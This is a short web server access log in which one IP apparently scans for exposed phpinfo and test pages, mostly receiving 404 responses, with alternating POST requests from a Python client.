20.211.45.185 - - [06/Sep/2022:15:33:51 +0000] "GET /info1.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:51 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:52 +0000] "GET /tools/info.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:53 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:54 +0000] "GET /php/phpinfo.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:55 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:55 +0000] "GET /info/info.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:56 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:56 +0000] "GET /dashboard/phpinfo.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:57 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:58 +0000] "GET /admin/phpinfo HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:33:58 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:33:59 +0000] "GET /index.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:00 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:00 +0000] "GET /admin/phpinfo.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:01 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:02 +0000] "GET /php_info.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:04 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:04 +0000] "GET /test1.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:05 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:06 +0000] "GET /phptest.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:07 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:08 +0000] "GET /phpinfo/phpinfo.php HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:09 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:10 +0000] "GET /in.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:11 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:11 +0000] "GET /inf.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:13 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:14 +0000] "GET /dashboard/phpinfo HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:15 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:15 +0000] "GET /info.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:16 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:17 +0000] "GET /phpinfo.php HTTP/1.1" 404 16 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:18 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
20.211.45.185 - - [06/Sep/2022:15:34:19 +0000] "GET /phpinfo HTTP/1.1" 404 196 "-" "Mozila/5.0"
20.211.45.185 - - [06/Sep/2022:15:34:20 +0000] "POST / HTTP/1.1" 200 32 "-" "python-requests/2.27.1"
209.222.252.91 - - [06/Sep/2022:15:36:03 +0000] "GET / HTTP/1.1" 200 32 "-" "Java/1.8.0_342"
